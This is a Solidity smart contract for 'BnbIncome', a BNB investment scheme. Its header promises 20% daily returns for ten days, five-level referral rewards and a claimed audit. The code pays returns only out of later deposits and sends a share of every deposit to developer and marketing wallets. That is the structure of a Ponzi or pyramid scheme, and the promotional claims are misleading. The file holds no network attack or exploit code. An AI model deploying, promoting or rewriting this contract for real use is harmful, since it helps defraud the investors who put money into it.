pragma solidity >=0.5.0;

/*
.....................................................................CCC.........OOOOOO.................................
...BBBBBBBBBB...NNNN....NNN..BBBBBBBBBB........III..NNNN....NNN....CCCCCCCC.....OOOOOOOOO...MMMMM...MMMMM..EEEEEEEEEE...
...BBBBBBBBBBB..NNNNN...NNN..BBBBBBBBBBB.......III..NNNNN...NNN...CCCCCCCCCC...OOOOOOOOOO...MMMMM...MMMMM..EEEEEEEEEE...
...BBBBBBBBBBB..NNNNN...NNN..BBBBBBBBBBB.......III..NNNNN...NNN..CCCCCCCCCCC..OOOOOOOOOOOO..MMMMMM..MMMMM..EEEEEEEEEE...
...BBBB...BBBB..NNNNNN..NNN..BBBB...BBBB.......III..NNNNNN..NNN..CCCC...CCCCC.OOOO....OOOO..MMMMMM.MMMMMM..EEEE.........
...BBBB..BBBBB..NNNNNNN.NNN..BBBB..BBBBB.......III..NNNNNNN.NNN.NCCCC....CCCC.OOOO....OOOOO.MMMMMM.MMMMMM..EEEEEEEEEE...
...BBBBBBBBBBB..NNNNNNN.NNN..BBBBBBBBBBB.......III..NNNNNNN.NNN.NCCC.........COOO......OOOO.MMMMMM.MMMMMM..EEEEEEEEEE...
...BBBBBBBBBBB..NNN.NNNNNNN..BBBBBBBBBBB.......III..NNN.NNNNNNN.NCCC.........COOO......OOOO.MMMMMM.MMMMMM..EEEEEEEEEE...
...BBBBBBBBBBB..NNN.NNNNNNN..BBBBBBBBBBB.......III..NNN.NNNNNNN.NCCC.........COOO......OOOO.MMMMMMMMMMMMM..EEEEEEEEEE...
...BBBB....BBBB.NNN..NNNNNN..BBBB....BBBB......III..NNN..NNNNNN.NCCCC....CCCC.OOOO....OOOOO.MMM.MMMMMMMMM..EEEE.........
...BBBB...BBBBB.NNN..NNNNNN..BBBB...BBBBB......III..NNN..NNNNNN..CCCC...CCCCC.OOOO....OOOO..MMM.MMMMM.MMM..EEEE.........
...BBBBBBBBBBB..NNN...NNNNN..BBBBBBBBBBB.......III..NNN...NNNNN..CCCCCCCCCCC..OOOOOOOOOOOO..MMM.MMMMM.MMM..EEEEEEEEEE...
...BBBBBBBBBBB..NNN...NNNNN..BBBBBBBBBBB.......III..NNN...NNNNN...CCCCCCCCCC...OOOOOOOOOO...MMM.MMMMM.MMM..EEEEEEEEEE...
...BBBBBBBBBB...NNN....NNNN..BBBBBBBBBB........III..NNN....NNNN....CCCCCCCC.....OOOOOOOOO...MMM.MMMMM.MMM..EEEEEEEEEE...
....................................................................CCCCC........OOOOOO.................................

(c) 2021 by Matrix Team
https://www.bnbincome.app

Project overview
----------------------------------------------
- 20% daily for 10 days (total 200%)
- 30% auto-reinvestment upon withdrawal
- 10% reinvestment or compounding bonus
- Withdrawal or Reinvest allowed only once a day and no more than 25% of the active deposit
- 5-Level Referral rewards (5% - 2.5% - 0.5% - 0.5% - 0.5%) which are paid directly to the wallet (P2P)

- 1% of each deposit goes to the Daily Bonus
- 1% of each deposit goes to the ReserveFund
- 5% of each deposit goes to the MarketingFund
- 2% of each deposit goes to the Developer and Support Team Fund

- Project of Matrix Team so we know what we are doing
- Audited by TechRate

Contacts
----------------------------------------------
Official Channel: https://t.me/bnbincome_channel
Telegram Group: https://t.me/bnbIncome

*/

contract BnbIncome {
    using SafeMath for uint256;
    uint256 private constant DEVELOPER_RATE = 20;
    uint256 private constant MARKETING_RATE = 50;
    uint256 private constant RESERVE_RATE = 10;
    uint256 private constant REFERENCE_LEVEL1_RATE = 50;
    uint256 private constant REFERENCE_LEVEL2_RATE = 25;
    uint256 private constant REFERENCE_LEVEL3_RATE = 5;
    uint256 private constant REFERENCE_LEVEL4_RATE = 5;
    uint256 private constant REFERENCE_LEVEL5_RATE = 5;
    uint256 private constant MIN_WITHDRAW = 0.05 ether;
    uint256 private constant MIN_ACTIVE_DEPOSIT = 0.01 ether;
    uint256 private constant MIN_DEPOSIT = 0.05 ether;
    uint256 private constant MAX_DEPOSIT = 100 ether;
    uint256 private constant MAX_DEPOSIT_COUNT = 200;
    uint256 private constant REFERRER_CODE = 1000;
    uint256 private constant PLAN_INTEREST = 200;
    uint256 private constant POOL_MAX = 25;
    uint256 private constant PLAN_TERM = 10 days;
    uint256 private constant TIME_STEP = 1 days;

    uint256 public  latestReferrerCode;
    uint256 public  totalInvestments;
    uint256 public  totalReInvestments;
    uint256 public  totalWithdraws;
    uint256 public  startTimestamp;

    address payable public developerAccount;
    address payable public marketingAccount;
    address payable public reserveAccount;

    struct Investment {
        uint256 investmentDate;
        uint256 investment;
        uint256 lastWithdrawalDate;
        uint256 withdrawn;
        bool isExpired;
    }

    struct Investor {
        address addr;
        uint256 checkpoint;
        uint256 referrerEarnings;
        uint256 referrer;
        uint256 planCount;
        mapping(uint256 => Investment) plans;
        uint8[5] refs;
        uint256 totalDeposit;
        uint256 totalWithdraw;
        uint256 totalReInvest;
        uint256 totalWin;
        uint256 remainDividends;
    }

    uint256 public pool_last_draw = block.timestamp;
    uint256 public pool_balance;
    uint256 public pool_cycle;
    mapping(uint8 => uint256) public pool_top;
    mapping(uint256 => mapping(uint256 => uint256)) public pool_users_refs_cnt;

    mapping(address => uint256) public address2UID;
    mapping(uint256 => Investor) public uid2Investor;

    event onInvest(address investor, uint256 amount);
    event onReinvest(address investor, uint256 amount);
    event onWithdraw(address investor, uint256 amount);

    constructor(address payable marketingAddr, address payable developerAddr, address payable reserveAddr, uint256 startTime) public {
        require(marketingAddr != address(0) && developerAddr != address(0) && reserveAddr != address(0) && startTime > uint256(0));
        developerAccount = developerAddr;
        marketingAccount = marketingAddr;
        reserveAccount = reserveAddr;
        startTimestamp = startTime;
        _init();
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function getUIDByAddress(address _addr) public view returns (uint256) {
        return address2UID[_addr];
    }

    function getInvestorAddrByUID(uint256 _uid) public view returns (address) {
        Investor storage investor = uid2Investor[_uid];
        return investor.addr;
    }

    function getInvestorInfoByUID(uint256 _uid) public view returns (uint256, uint256, uint256, uint256, uint256, uint256[] memory) {
        Investor storage investor = uid2Investor[_uid];
        uint256[] memory newDividends = new uint256[](investor.planCount);
        for (uint256 i = 0; i < investor.planCount; i++) {
            require(investor.plans[i].investmentDate != 0, "Wrong investment date");
            if (investor.plans[i].isExpired) {
                newDividends[i] = 0;
            } else {
                if (block.timestamp >= investor.plans[i].investmentDate.add(PLAN_TERM)) {
                    newDividends[i] = _calculateDividends(investor.plans[i].investment, PLAN_INTEREST, investor.plans[i].investmentDate.add(PLAN_TERM), investor.plans[i].lastWithdrawalDate);
                } else {
                    newDividends[i] = _calculateDividends(investor.plans[i].investment, PLAN_INTEREST, block.timestamp, investor.plans[i].lastWithdrawalDate);
                }
            }
        }
        return
        (
        investor.referrerEarnings,
        investor.remainDividends,
        investor.referrer,
        investor.planCount,
        investor.checkpoint,
        newDividends
        );
    }

    function getInvestorRefs(uint256 _uid) public view returns (uint256, uint256, uint256, uint256, uint256) {
        Investor storage investor = uid2Investor[_uid];
        return
        (
        investor.refs[0],
        investor.refs[1],
        investor.refs[2],
        investor.refs[3],
        investor.refs[4]
        );
    }

    function getInvestmentPlanByUID(uint256 _uid) public view returns (uint256[] memory, uint256[] memory, uint256[] memory, bool[] memory) {
        Investor storage investor = uid2Investor[_uid];
        uint256[] memory investmentDates = new  uint256[](investor.planCount);
        uint256[] memory investments = new  uint256[](investor.planCount);
        uint256[] memory withdrawn = new  uint256[](investor.planCount);
        bool[] memory isExpired = new  bool[](investor.planCount);

        for (uint256 i = 0; i < investor.planCount; i++) {
            require(investor.plans[i].investmentDate != 0, "Wrong investment date");
            withdrawn[i] = investor.plans[i].withdrawn;
            investmentDates[i] = investor.plans[i].investmentDate;
            investments[i] = investor.plans[i].investment;
            if (investor.plans[i].isExpired) {
                isExpired[i] = true;
            } else {
                isExpired[i] = false;
                if (PLAN_TERM > 0) {
                    if (block.timestamp >= investor.plans[i].investmentDate.add(PLAN_TERM)) {
                        isExpired[i] = true;
                    }
                }
            }
        }

        return
        (
        investmentDates,
        investments,
        withdrawn,
        isExpired
        );
    }

    function getInvestorDividends(uint256 _uid) public view returns (uint256) {
        uint256 withdrawalAmount = 0;
        for (uint256 i = 0; i < uid2Investor[_uid].planCount; i++) {
            if (uid2Investor[_uid].plans[i].isExpired) {
                continue;
            }

            uint256 withdrawalDate = block.timestamp;
            uint256 endTime = uid2Investor[_uid].plans[i].investmentDate.add(PLAN_TERM);
            if (withdrawalDate >= endTime) {
                withdrawalDate = endTime;
            }

            uint256 amount = _calculateDividends(uid2Investor[_uid].plans[i].investment, PLAN_INTEREST, withdrawalDate, uid2Investor[_uid].plans[i].lastWithdrawalDate);

            withdrawalAmount += amount;

        }

        if (uid2Investor[_uid].remainDividends > 0) {
            withdrawalAmount += uid2Investor[_uid].remainDividends;
        }

        return withdrawalAmount;
    }

    function getInvestorActiveDeposits(uint256 _uid) public view returns (uint256) {
        uint256 activeAmount = 0;
        for (uint256 i = 0; i < uid2Investor[_uid].planCount; i++) {
            if (uid2Investor[_uid].plans[i].isExpired) {
                continue;
            }
            activeAmount += uid2Investor[_uid].plans[i].investment;
        }
        return activeAmount;
    }

    function getInvestorTotalStats(uint256 _uid) public view returns (uint256, uint256, uint256, uint256, uint256) {
        Investor storage investor = uid2Investor[_uid];
        return (
        investor.totalDeposit,
        investor.totalWithdraw,
        investor.totalReInvest,
        investor.totalWin,
        investor.remainDividends
        );
    }

    function invest(uint256 _referrerCode) public payable {
        if (_invest(msg.sender, _referrerCode, msg.value)) {
            emit onInvest(msg.sender, msg.value);
        }
    }

    function autoReinvest(address _addr, uint256 _amount) private returns (bool) {

        uint256 uid = address2UID[_addr];
        uint256 planCount = uid2Investor[uid].planCount;

        Investor storage investor = uid2Investor[uid];
        investor.plans[planCount].investmentDate = block.timestamp;
        investor.plans[planCount].lastWithdrawalDate = block.timestamp;
        investor.plans[planCount].investment = _amount;
        investor.plans[planCount].withdrawn = 0;
        investor.plans[planCount].isExpired = false;

        investor.planCount = investor.planCount.add(1);
        totalReInvestments = totalReInvestments.add(_amount);
        investor.totalReInvest = investor.totalReInvest.add(_amount);
        return true;
    }

    function withdraw() public {

        uint256 uid = address2UID[msg.sender];
        require(uid != 0, "Can not withdraw because no any investments");

        //Only once a day
        require(block.timestamp > uid2Investor[uid].checkpoint + TIME_STEP, "Only once a day");
        uid2Investor[uid].checkpoint = block.timestamp;

        uint256 dividends = getInvestorDividends(uid);
        require(dividends > MIN_WITHDRAW, "Min withdraw is 0.05 BNB");

        uint256 activeDeposits = getInvestorActiveDeposits(uid);
        require(activeDeposits > MIN_ACTIVE_DEPOSIT, "Min active deposit is 0.01 BNB");

        uint256 withdrawalAmount = 0;
        for (uint256 i = 0; i < uid2Investor[uid].planCount; i++) {
            if (uid2Investor[uid].plans[i].isExpired) {
                continue;
            }

            bool isExpired = false;
            uint256 withdrawalDate = block.timestamp;
            uint256 endTime = uid2Investor[uid].plans[i].investmentDate.add(PLAN_TERM);
            if (withdrawalDate >= endTime) {
                withdrawalDate = endTime;
                isExpired = true;
            }

            uint256 amount = _calculateDividends(uid2Investor[uid].plans[i].investment, PLAN_INTEREST, withdrawalDate, uid2Investor[uid].plans[i].lastWithdrawalDate);

            withdrawalAmount += amount;

            uid2Investor[uid].plans[i].lastWithdrawalDate = withdrawalDate;
            uid2Investor[uid].plans[i].isExpired = isExpired;
            uid2Investor[uid].plans[i].withdrawn += amount;
        }

        if (uid2Investor[uid].remainDividends > 0) {
            withdrawalAmount += uid2Investor[uid].remainDividends;
            uid2Investor[uid].remainDividends = 0;
        }

        if (withdrawalAmount > 0) {

            uint256 limit = activeDeposits.div(4);
            if (withdrawalAmount > limit) {
                uid2Investor[uid].remainDividends += (withdrawalAmount - limit);
                withdrawalAmount = limit;
            }

            uint256 currentBalance = getBalance();
            if (withdrawalAmount >= currentBalance) {
                uid2Investor[uid].remainDividends += (withdrawalAmount - currentBalance);
                withdrawalAmount = currentBalance;
            }
            uint256 reinvestAmount = withdrawalAmount * 30 / 100;
            //ReInvest
            autoReinvest(msg.sender, reinvestAmount);
            //Withdraw
            msg.sender.transfer(withdrawalAmount.sub(reinvestAmount));
            uid2Investor[uid].totalWithdraw = uid2Investor[uid].totalWithdraw.add(withdrawalAmount);
            totalWithdraws = totalWithdraws.add(withdrawalAmount);
        }

        emit onWithdraw(msg.sender, withdrawalAmount);
    }

    function reinvest() public {

        uint256 uid = address2UID[msg.sender];
        require(uid != 0, "Can not reinvest because no any investments");

        //only once a day
        require(block.timestamp > uid2Investor[uid].checkpoint + TIME_STEP, "Only once a day");
        uid2Investor[uid].checkpoint = block.timestamp;

        uint256 withdrawalAmount = 0;
        for (uint256 i = 0; i < uid2Investor[uid].planCount; i++) {
            if (uid2Investor[uid].plans[i].isExpired) {
                continue;
            }

            bool isExpired = false;
            uint256 withdrawalDate = block.timestamp;
            uint256 endTime = uid2Investor[uid].plans[i].investmentDate.add(PLAN_TERM);
            if (withdrawalDate >= endTime) {
                withdrawalDate = endTime;
                isExpired = true;
            }

            uint256 amount = _calculateDividends(uid2Investor[uid].plans[i].investment, PLAN_INTEREST, withdrawalDate, uid2Investor[uid].plans[i].lastWithdrawalDate);

            withdrawalAmount += amount;

            uid2Investor[uid].plans[i].lastWithdrawalDate = withdrawalDate;
            uid2Investor[uid].plans[i].isExpired = isExpired;
            uid2Investor[uid].plans[i].withdrawn += amount;
        }

        if (uid2Investor[uid].remainDividends > 0) {
            withdrawalAmount += uid2Investor[uid].remainDividends;
            uid2Investor[uid].remainDividends = 0;
        }

        if (withdrawalAmount > MAX_DEPOSIT) {
            uid2Investor[uid].remainDividends += (withdrawalAmount - MAX_DEPOSIT);
            withdrawalAmount = MAX_DEPOSIT;
        }


        if (withdrawalAmount > 0) {
            //Reinvest
            _reinvestAll(msg.sender, withdrawalAmount);
        }

        emit onReinvest(msg.sender, withdrawalAmount);
    }

    function poolTopInfo(uint256 cycle) view public returns (address[POOL_MAX] memory addrs, uint256[POOL_MAX] memory uid, uint256[POOL_MAX] memory deps) {
        for (uint8 i = 0; i < POOL_MAX; i++) {
            if (pool_top[i] < REFERRER_CODE) break;

            addrs[i] = getInvestorAddrByUID(pool_top[i]);
            uid[i] = pool_top[i];
            deps[i] = pool_users_refs_cnt[cycle][pool_top[i]];
        }
    }

    function lastPoolTopInfo() view public returns (address[POOL_MAX] memory addrs, uint256[POOL_MAX] memory uid, uint256[POOL_MAX] memory deps) {
        for (uint8 i = 0; i < POOL_MAX; i++) {
            if (pool_top[i] < REFERRER_CODE) break;

            addrs[i] = getInvestorAddrByUID(pool_top[i]);
            uid[i] = pool_top[i];
            deps[i] = pool_users_refs_cnt[pool_cycle][pool_top[i]];
        }
    }

    function _init() private {
        latestReferrerCode = REFERRER_CODE;
        address2UID[msg.sender] = latestReferrerCode;
        uid2Investor[latestReferrerCode].addr = msg.sender;
        uid2Investor[latestReferrerCode].referrer = 0;
        uid2Investor[latestReferrerCode].planCount = 0;
    }

    function _addInvestor(address _addr, uint256 _referrerCode) private returns (uint256) {
        if (_referrerCode >= REFERRER_CODE) {
            if (uid2Investor[_referrerCode].addr == address(0)) {
                _referrerCode = 0;
            }
        } else {
            _referrerCode = 0;
        }
        address addr = _addr;
        latestReferrerCode = latestReferrerCode.add(1);
        address2UID[addr] = latestReferrerCode;
        uid2Investor[latestReferrerCode].addr = addr;
        uid2Investor[latestReferrerCode].referrer = _referrerCode;
        uid2Investor[latestReferrerCode].planCount = 0;
        if (_referrerCode >= REFERRER_CODE) {

            uint256 upLine = _referrerCode;
            for (uint256 i = 0; i < 5; i++) {
                if (upLine >= REFERRER_CODE) {
                    uid2Investor[upLine].refs[i] += 1;
                    upLine = uid2Investor[upLine].referrer;
                } else break;
            }
        }
        return (latestReferrerCode);
    }

    function _invest(address _addr, uint256 _referrerCode, uint256 _amount) private returns (bool) {
        require(block.timestamp >= startTimestamp, "Contract is not started yet");
        require(_amount >= MIN_DEPOSIT, "Less than the minimum amount of deposit requirement");
        require(_amount <= MAX_DEPOSIT, "Greater than the maximum amount of deposit requirement");
        uint256 uid = address2UID[_addr];

        //New User
        if (uid == 0) {
            uid = _addInvestor(_addr, _referrerCode);
        }

        uint256 planCount = uid2Investor[uid].planCount;
        require(planCount < MAX_DEPOSIT_COUNT, "Max 200 deposit each address");
        Investor storage investor = uid2Investor[uid];
        investor.plans[planCount].investmentDate = block.timestamp;
        investor.plans[planCount].lastWithdrawalDate = block.timestamp;
        investor.plans[planCount].investment = _amount;
        investor.plans[planCount].withdrawn = 0;
        investor.plans[planCount].isExpired = false;

        investor.planCount = investor.planCount.add(1);

        _calculateReferrerReward(_amount, investor.referrer);

        investor.totalDeposit = investor.totalDeposit.add(_amount);
        totalInvestments = totalInvestments.add(_amount);

        developerAccount.transfer(_amount.mul(DEVELOPER_RATE).div(1000));
        marketingAccount.transfer(_amount.mul(MARKETING_RATE).div(1000));
        reserveAccount.transfer(_amount.mul(RESERVE_RATE).div(1000));


        _pollDeposits(uid, _amount);
        if (pool_last_draw + TIME_STEP < block.timestamp) {
            _drawPool();
        }

        return true;
    }

    function _pollDeposits(uint256 _uid, uint256 _amount) private {
        pool_balance += _amount.div(100);

        uint256 upLine = uid2Investor[_uid].referrer;

        if (upLine < REFERRER_CODE) return;

        pool_users_refs_cnt[pool_cycle][upLine] += 1;

        for (uint8 i = 0; i < POOL_MAX; i++) {
            if (pool_top[i] == upLine) break;

            if (pool_top[i] < REFERRER_CODE) {
                pool_top[i] = upLine;
                break;
            }

            if (pool_users_refs_cnt[pool_cycle][upLine] > pool_users_refs_cnt[pool_cycle][pool_top[i]]) {
                for (uint8 j = i + 1; j < POOL_MAX; j++) {
                    if (pool_top[j] == upLine) {
                        for (uint8 k = j; k <= POOL_MAX; k++) {
                            pool_top[k] = pool_top[k + 1];
                        }
                        break;
                    }
                }

                for (uint8 j = uint8(POOL_MAX - 1); j > i; j--) {
                    pool_top[j] = pool_top[j - 1];
                }

                pool_top[i] = upLine;
                break;
            }
        }
    }

    function _drawPool() private {
        pool_last_draw = block.timestamp;

        uint256 draw_amount = pool_balance;

        uint256 cnt = 0;
        for (uint8 i = 0; i < POOL_MAX; i++) {
            if (pool_top[i] >= REFERRER_CODE) {
                cnt += pool_users_refs_cnt[pool_cycle][pool_top[i]];
            }
        }

        for (uint8 i = 0; i < POOL_MAX; i++) {
            if (pool_top[i] < REFERRER_CODE) break;

            uint256 win = draw_amount.mul(pool_users_refs_cnt[pool_cycle][pool_top[i]]).div(cnt);

            uid2Investor[pool_top[i]].totalWin += win;
            uid2Investor[pool_top[i]].remainDividends += win;
            pool_balance = pool_balance.subZ(win);

        }

        for (uint8 i = 0; i < POOL_MAX; i++) {
            pool_top[i] = 0;
        }

        pool_cycle++;
    }

    function _reinvestAll(address _addr, uint256 _amount) private returns (bool) {

        require(_amount >= MIN_DEPOSIT, "Less than the minimum amount of deposit requirement");
        require(_amount <= MAX_DEPOSIT, "Greater than the maximum amount of deposit requirement");
        uint256 uid = address2UID[_addr];
        uint256 planCount = uid2Investor[uid].planCount;
        require(planCount < MAX_DEPOSIT_COUNT, "Max 200 deposit each address");

        //Extra bonus
        uint256 extra = _amount.div(10);

        Investor storage investor = uid2Investor[uid];
        investor.plans[planCount].investmentDate = block.timestamp;
        investor.plans[planCount].lastWithdrawalDate = block.timestamp;
        investor.plans[planCount].investment = _amount.add(extra);
        investor.plans[planCount].withdrawn = 0;
        investor.plans[planCount].isExpired = false;

        investor.planCount = investor.planCount.add(1);

        totalReInvestments = totalReInvestments.add(_amount.add(extra));
        investor.totalReInvest = investor.totalReInvest.add(_amount.add(extra));

        developerAccount.transfer(_amount.mul(DEVELOPER_RATE).div(1000));
        marketingAccount.transfer(_amount.mul(MARKETING_RATE).div(1000));
        reserveAccount.transfer(_amount.mul(RESERVE_RATE).div(1000));

        return true;
    }

    function _calculateDividends(uint256 _amount, uint256 _dailyInterestRate, uint256 _now, uint256 _start) private pure returns (uint256) {
        return (_amount * _dailyInterestRate / 1000 * (_now - _start)) / (TIME_STEP);
    }

    function _calculateReferrerReward(uint256 _investment, uint256 _referrerCode) private {

        if (_referrerCode != 0) {
            uint256 _ref1 = _referrerCode;
            uint256 _ref2 = uid2Investor[_ref1].referrer;
            uint256 _ref3 = uid2Investor[_ref2].referrer;
            uint256 _ref4 = uid2Investor[_ref3].referrer;
            uint256 _ref5 = uid2Investor[_ref4].referrer;
            uint256 _refAmount = 0;

            if (_ref1 != 0) {
                _refAmount = (_investment.mul(REFERENCE_LEVEL1_RATE)).div(1000);
                uid2Investor[_ref1].referrerEarnings = _refAmount.add(uid2Investor[_ref1].referrerEarnings);
                address(uint160(uid2Investor[_ref1].addr)).transfer(_refAmount);
            }

            if (_ref2 != 0) {
                _refAmount = (_investment.mul(REFERENCE_LEVEL2_RATE)).div(1000);
                uid2Investor[_ref2].referrerEarnings = _refAmount.add(uid2Investor[_ref2].referrerEarnings);
                address(uint160(uid2Investor[_ref2].addr)).transfer(_refAmount);
            }

            if (_ref3 != 0) {
                _refAmount = (_investment.mul(REFERENCE_LEVEL3_RATE)).div(1000);
                uid2Investor[_ref3].referrerEarnings = _refAmount.add(uid2Investor[_ref3].referrerEarnings);
                address(uint160(uid2Investor[_ref3].addr)).transfer(_refAmount);
            }

            if (_ref4 != 0) {
                _refAmount = (_investment.mul(REFERENCE_LEVEL4_RATE)).div(1000);
                uid2Investor[_ref4].referrerEarnings = _refAmount.add(uid2Investor[_ref4].referrerEarnings);
                address(uint160(uid2Investor[_ref4].addr)).transfer(_refAmount);
            }

            if (_ref5 != 0) {
                _refAmount = (_investment.mul(REFERENCE_LEVEL5_RATE)).div(1000);
                uid2Investor[_ref5].referrerEarnings = _refAmount.add(uid2Investor[_ref5].referrerEarnings);
                address(uint160(uid2Investor[_ref5].addr)).transfer(_refAmount);
            }
        }
    }

    function _poolTop() public view returns (uint256) {
        uint8 cnt = 0;
        for (uint8 i = 0; i < POOL_MAX; i++) {
            if (pool_top[i] >= REFERRER_CODE) {
                cnt++;
            }
        }
        return cnt;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function subZ(uint256 a, uint256 b) internal pure returns (uint256) {
        if (b >= a) {
            return 0;
        }
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: modulo by zero");
        return a % b;
    }
}

/* (c) BnbIncome.app */